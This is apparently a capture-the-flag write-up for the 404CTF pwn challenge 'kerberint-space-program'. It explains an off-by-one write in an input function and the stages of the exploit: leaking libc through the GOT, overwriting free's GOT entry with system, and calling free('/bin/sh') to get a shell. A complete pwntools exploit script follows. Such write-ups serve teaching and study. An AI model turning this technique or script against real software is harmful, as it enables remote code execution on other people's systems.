# 404CTF - kerberint-space-program

**Points:** 205 \
**Category:** Pwn

---

## TL;DR

[This challenge makes use of an out-of-bound write to get arbitrary read and write.]

---

## Provided files:
- **chall** : ELF 64-bit binary.
- **libc.so.6** : libc 2.40 file.
- **main.c** : source code.

Protections on the binary:

![Checksec](./pics/Screenshot%20from%202025-07-16%2001-42-43.png)

## The binary's code:

Here are the interesting parts of program :

```
void menu(void) {
    puts("-----------------|KSP|-----------------");
    puts("1. Create your rocket                  ");
    puts("2. Edit your rocket price              ");
    puts("3. Edit your rocket name               ");
    puts("4. Edit your rocket description        ");
    puts("5. Display your rocket metadata        ");
    puts("6. Exit                                ");
}

struct rocket {
    long price;
    char name[0x10];
    char* description;
};

struct rocket *user_rocket = NULL;

void take_input(char *buf, size_t len) {
    char c = -1;
    int i = 0;
    while (i <= len && c != '\n') {
        c = getchar();
        buf[i] = c;
        i++;
    }
    buf[i] = 0;
}

void initialize_rocket() {
    user_rocket = malloc(sizeof(struct rocket));

    printf("Choose the price >> ");
    scanf("%ld", &user_rocket->price);
    getchar();

    printf("Choose its name >> ");
    take_input(user_rocket->name, 0x10);

    user_rocket->description = malloc(0x100);
    printf("Choose its description >> ");
    take_input(user_rocket->description, 0x100);
}

void edit_rocket_price() {
    printf("Choose the price >> ");
    scanf("%ld", &user_rocket->price);
}

void edit_rocket_name() {
    printf("Choose its name >> ");
    take_input(user_rocket->name, strlen(user_rocket->name));
}

void edit_rocket_description() {
    printf("Choose its description >> ");
    take_input(user_rocket->description, 0x100);
}
i
void display() {
    printf("Price : %ld €\n", user_rocket->price);
    printf("Name : %s\n", user_rocket->name);
    printf("Description : %s\n", user_rocket->description);
}

void free_user_rocket() {
    free(user_rocket->description);
    free(user_rocket);
}

```

The program is quite straightfowrd; it creates/edits/displays rockets using the structure `struct rocket` which is composed of a price(`int`), a name (`char[0x10]`) and a description(`char*`). 

![Checksec](./pics/Screenshot%20from%202025-07-15%2010-29-15.png)

## The Vulnerability :
The vulnerability lies in the `take_input(char *buf, size_t len)` function, which is supposed to get at most `len` characters, but looking at the loop:

```   
    int i = 0;
    while (i <= len && c != '\n') {
        c = getchar();
        buf[i] = c;
        i++;
    }
    buf[i] = 0;
```
we can see that this function can take up to `len + 1` characters because of the `while (i <= len && c != '\n')`. It sould've been `while (i < len && c != '\n')`(strict < without the =).


## Initial Analysis
The binary is dynamically linked to the libc, so we'll make use of the `system` function to spawn a shell after leaking an address of libc.

So, roughly speaking, the exploitation path is using the oob write to leak and modify GOT addresses. 

## Stage 1: Leak a GOT libc address

The binary has no PIE protection, therefore the address of the GOT section is known, and those of all the other sections as well.

I chose the `puts`'s GOT entry that is stored in `0x405008` to leak, and to do so, we overwrite the pointer of `description` with `0x405008`: the address is inserted byte by byte in order to bypass the `take_input` checks.

```
    for i in range(0, lim):
        if i > 0:
            resp = p.recv()
        p.sendline(b"3")
        p.recv()
        payload = b"a"*16 + b"\x08" + b"\x50"*(int(i>0)) + b"\x40"*(int(i>1)) + b"\x00\x00"*(int(i>2))
        payload += b"\x00\x00"*(int(i>3)) + b"\x00"*(int(i>4)) + b"\x00"*(int(i>5)) + b"\x00"*(int(i>6))
        p.sendline(payload)
```

 and then call the `display()` function to print the libc address of `puts`:
 ```
 p.sendline(b"5") # get the libc leak
 puts_addr = get_leak(p) # Parsing recv() data
 ``` 


## Stage 2: Overwrite a GOT entry

After getting the `puts` leak, we can calculate the addresses of the other libc functions like `system` using their known offsets.\
Now, we proceed onto overwriting `free`'s GOT entry with `system`'s libc address using the same strategy of overwriting `description`'s address with free's GOT address : `0x405000` :
```
        p.sendline(b"3")
        p.recv()
        payload = b"a"*16 + b"\x00\x50\x40\x00"
        p.sendline(payload)
```
and then use `edit_rocket_description` function to write  system's address into it:
```
p.sendline(b"4") # Edit Description
p.recv()

p.sendline(p64(system_addr) + p64(puts_addr) + p64(strlen_addr) + p64(printf_addr) + p64(getchar_addr) + p64(malloc_addr))
```
Here, we not only overwrite free's entry, but all the adjecent ones til `exit`, to avoid the nullbyte that `take_input` appends at the end of each read.


## Stage 3: Trigger a free('/bin/sh')
Everything is setup in it's place, all we need now is to trigger a free on "/bin/sh" chunk.

```
p.sendline(b"4") # Edit description
p.recv()

p.sendline(b"/bin/sh\x00") # to /bin/sh
p.recv()


p.sendline(b"6") # Trigger
```
`free("/bin/sh")` = `system("/bin/sh")` which gives a shell.

![Checksec](./pics/Screenshot%20from%202025-05-25%2023-25-15.png)


### Proof of Concept

```
from pwn import *
import struct
import re


mall = 2600

def get_leak(p):
    raw = p.recv()
    marker = b'Description : '
    start = raw.find(marker)
    if start == -1:
        raise ValueError("Marker not found in output")

    # Extract the bytes that follow — we assume 6-byte pointer
    leak_bytes = raw[start + len(marker):start + len(marker) + 6]

    # Pad to 8 bytes for 64-bit unpacking
    leak_addr = struct.unpack("<Q", leak_bytes.ljust(8, b'\x00'))[0]

    print(f"[+] Leaked address: {hex(leak_addr)}, type: {type(leak_addr)}")
    return leak_addr


def init_g(p):
	p.recv()
	p.sendline(b"1")
	p.recv()
	p.sendline(b"1")
	p.recv()
	p.sendline(b"a"*17)

def extract(data):
    print(f"HEAP INFO {data}")
    match1 = re.search(b'Name : (.+)(.{4})\n', data)
    if match1:
        # The last 4 bytes before newline are likely the address bytes
        address_bytes = match1.group(2)
        addr_8 = int.from_bytes(address_bytes, 'little')
        print(f"Extracted address bytes: {hex(addr_8)}")
        return addr_8
        
    else:
        print("No match found")

def trigger_fault_backup_3(p, lim=4):
    org_malloc = 0
    for i in range(0, 1):
        if i > 0:
            resp = p.recv()
        p.sendline(b"3")
        p.recv()
        payload = b"a"*16 + b"\x00\x50\x40\x00"
        p.sendline(payload)


def trigger_fault_backup(p, lim=4):
    global mall
    org_malloc = 0
    for i in range(0, lim):
        if i > 0:
            resp = p.recv()
        p.sendline(b"3")
        p.recv()
        payload = b"a"*16 + b"\x08" + b"\x50"*(int(i>0)) + b"\x40"*(int(i>1)) + b"\x00\x00"*(int(i>2))
        payload += b"\x00\x00"*(int(i>3)) + b"\x00"*(int(i>4)) + b"\x00"*(int(i>5)) + b"\x00"*(int(i>6))
        p.sendline(payload)


def trigger_fault_2(p, addr, lim=6):
    addrs = addr.to_bytes(6, 'little')
    print(f"Address to inject : {hex(addr)}")
    print(addr)
    for i in range(0, lim):
        print(f"Round {i}")
        if(i > 0):
            print(p.recv().decode())
        p.sendline(b"3")
        print(p.recv().decode())
        payload = b"a"*16 + bytes([addrs[0]]) + bytes([addrs[1]])*(int(i>0)) + bytes([addrs[2]])*(int(i>1)) + (bytes([addrs[3]]) + b"\x00")*(int(i>2))
        payload += bytes([addrs[4]])*(int(i>3)) + (bytes([addrs[5]]) + b"\x00")*(int(i>4))
        p.sendline(payload)

p = remote('challenges.404ctf.fr', 31338)
#p = process('./chall')

# puts@got.plt 0x405008

init_g(p)
print(f"STEP #1: {p.recv().decode()}")
p.sendline(b"5") # get the libc leak

heap_info = p.recv()
mall = extract(p.recv())

trigger_fault_backup(p)
#print(f"STEP #2: {p.recv()}")

p.recv()
p.sendline(b"5") # get the libc leak

# Calculating addresses
puts_addr = get_leak(p) # offset = 0x5daa0
libc_addr = puts_addr - 0x5daa0
freehook_addr = libc_addr +     0x1f01a8
strlen_addr = libc_addr + 0x88a80
printf_addr = libc_addr + 0x35b40
getchar_addr = libc_addr + 0x64a50
malloc_addr = libc_addr + 0x812d0
system_addr = libc_addr + 0x2edb0
binsh_addr = libc_addr + 0x1b1ece

#gdb.attach(p, gdbscript='''
#break do_system
#''')


trigger_fault_backup_3(p) # Edit free @ got.plt
p.recv()

p.sendline(b"4") # Edit Description
p.recv()

p.sendline(p64(system_addr) + p64(puts_addr) + p64(strlen_addr) + p64(printf_addr) + p64(getchar_addr) + p64(malloc_addr)) #.. .to_bytes(6, 'little')
p.recv()

trigger_fault_2(p, mall) # Set description = original malloc
p.recv()

p.sendline(b"4") # Edit description
p.recv()

p.sendline(b"/bin/sh\x00") # to /bin/sh
p.recv()


p.sendline(b"6") # Trigger

p.interactive()
p.close()



```
